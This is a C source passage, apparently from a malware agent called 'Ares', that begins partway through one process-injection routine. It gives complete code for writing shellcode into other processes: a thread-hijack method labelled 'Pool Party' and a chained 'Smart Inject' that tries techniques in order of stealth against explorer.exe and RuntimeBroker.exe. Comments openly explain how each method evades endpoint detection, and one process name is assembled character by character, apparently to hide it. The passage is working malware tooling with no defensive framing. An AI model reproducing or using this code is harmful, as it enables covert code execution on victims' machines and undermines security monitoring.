    status = Ares_NtWriteVirtualMemory(
        state, pi.hProcess, remoteBase,
        (PVOID)shellcode, shellcode_len, &written);
    if (status != 0) goto fail;

    ULONG oldProtect;
    status = Ares_NtProtectVirtualMemory(
        state, pi.hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);

    QueueUserAPC((PAPCFUNC)remoteBase, pi.hThread, 0);

    /* 5. Resume → wait → terminate */
    ULONG _sc = 0;
    Ares_NtResumeThread(state, pi.hThread, &_sc);

    /* Wait for shellcode to finish (or timeout) */
    WaitForSingleObject(pi.hProcess, timeout_ms ? timeout_ms : 30000);
    TerminateProcess(pi.hProcess, 0);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;

fail:
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
}


#ifdef CFG_POOL_PARTY
/* ===============================================================
 *  Pool Party Injection (v3.9) -- Thread pool worker hijack
 *
 *  Why it evades EDR:
 *    - No NtCreateThreadEx or NtQueueApcThread signals
 *    - Hijacks an EXISTING thread in target (no thread creation)
 *    - SetThreadContext + RIP redirect on suspended thread
 *    - Execution stack looks like normal thread pool dispatch
 *
 *  Steps:
 *    1. NtAllocateVirtualMemory + write shellcode (RX)
 *    2. NtQuerySystemInformation -> find thread in target pid
 *    3. SuspendThread -> redirect RIP -> ResumeThread
 * =============================================================== */

BOOL Ares_Inject_PoolParty(AGENT_STATE* state,
    DWORD target_pid,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    if (!state || !shellcode || shellcode_len == 0 || target_pid == 0)
        return FALSE;

    HANDLE hProcess = NULL;
    NTSTATUS st = Ares_NtOpenProcess(state, &hProcess,
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION, target_pid);
    if (!NT_SUCCESS(st) || !hProcess) return FALSE;

    PVOID remoteBase = NULL;
    SIZE_T allocSize = shellcode_len;
    st = Ares_NtAllocateVirtualMemory(state, hProcess, &remoteBase,
        &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) { CloseHandle(hProcess); return FALSE; }

    SIZE_T written = 0;
    st = Ares_NtWriteVirtualMemory(state, hProcess, remoteBase,
        (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        CloseHandle(hProcess); return FALSE;
    }

    ULONG oldProt = 0;
    SIZE_T regionSz = shellcode_len;
    Ares_NtProtectVirtualMemory(state, hProcess, &remoteBase, &regionSz,
        PAGE_EXECUTE_READ, &oldProt);

    /* Find a thread in target via NtQuerySystemInformation */
    typedef NTSTATUS (NTAPI *PNtQSI)(ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PNtQSI pNtQSI = (PNtQSI)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQSI) { CloseHandle(hProcess); return FALSE; }

    ULONG bufSize = 0x80000;
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hProcess); return FALSE; }

    for (int retry = 0; retry < 4; retry++) {
        ULONG needed = 0;
        NTSTATUS s2 = pNtQSI(5, buf, bufSize, &needed);
        if (s2 == 0) break;
        if (s2 == 0xC0000004L) {
            VirtualFree(buf, 0, MEM_RELEASE);
            bufSize = needed + 0x4000;
            buf = (BYTE*)VirtualAlloc(NULL, bufSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (!buf) { CloseHandle(hProcess); return FALSE; }
        } else break;
    }

    HANDLE hThread = NULL;
    BYTE* cur = buf;
    while (cur) {
        ULONG nextOff  = *(ULONG*)cur;
        ULONG thrCount = *(ULONG*)(cur + 4);
        HANDLE pid_h   = *(HANDLE*)(cur + 0x50);
        if ((DWORD)(ULONG_PTR)pid_h == target_pid && thrCount > 0) {
            BYTE* te = cur + 0x100;
            for (ULONG ti = 0; ti < thrCount; ti++) {
                DWORD tid = (DWORD)(ULONG_PTR)(*(HANDLE*)(te + 0x10));
                if (tid && tid != GetCurrentThreadId()) {
                    HANDLE ht = OpenThread(
                        THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|
                        THREAD_SUSPEND_RESUME|THREAD_QUERY_INFORMATION,
                        FALSE, tid);
                    if (ht) { hThread = ht; break; }
                }
                te += 0x80;
            }
            break;
        }
        if (!nextOff) break;
        cur += nextOff;
    }
    VirtualFree(buf, 0, MEM_RELEASE);

    if (!hThread) { CloseHandle(hProcess); return FALSE; }

    if (SuspendThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread); CloseHandle(hProcess); return FALSE;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        ResumeThread(hThread);
        CloseHandle(hThread); CloseHandle(hProcess); return FALSE;
    }

    ctx.Rip = (DWORD64)remoteBase;
    ctx.Rsp &= ~0xFULL; /* 16-byte align RSP (x64 ABI) */
    BOOL ok = SetThreadContext(hThread, &ctx);

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return ok;
}

#endif /* CFG_POOL_PARTY */

/* ═══════════════════════════════════════════════��═══════════════
 *  Smart Inject — Priority chain for maximum evasion
 *
 *  Tries techniques in order of stealth:
 *    1. Threadless (KernelCallbackTable) — no thread, no hook
 *    2. Sacrificial + PPID spoof — isolated process
 *    3. Early Bird APC — new suspended process
 *    4. Remote Thread — highest compat, lowest stealth
 * ═══════════════════════════════════════════════════════════════ */

int Ares_InjectSmart(AGENT_STATE* state,
    const char* target_process,
    const BYTE* shellcode, SIZE_T shellcode_len)
{
    /* Resolve PID for Pool Party */
    DWORD pp_pid = 0;
    if (target_process) pp_pid = find_process(target_process);
    if (!pp_pid) {
        static const char _xpl[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};
        pp_pid = find_process(_xpl);
    }

#ifdef CFG_POOL_PARTY
    /* 1. Pool Party -- hijack existing thread, no NtCreateThreadEx */
    if (pp_pid && Ares_Inject_PoolParty(state, pp_pid, shellcode, shellcode_len))
        return 1;
#endif

    /* 2. Threadless — best stealth, no new thread */
    if (Ares_Inject_Threadless(state, target_process, shellcode, shellcode_len))
        return 1;

    /* 2. Sacrificial + PPID spoof — isolated execution */
    if (Ares_Inject_Sacrificial(state, shellcode, shellcode_len, 30000))
        return 2;

    /* 3. Early Bird APC */
    if (Ares_Inject_EarlyBird(state,
            L"C:\\Windows\\System32\\RuntimeBroker.exe",
            shellcode, shellcode_len))
        return 3;

    /* 4. Remote Thread — last resort */
    if (target_process &&
        Ares_Inject_RemoteThread(state, target_process, shellcode, shellcode_len))
        return 4;

    return 0; /* All failed */
}


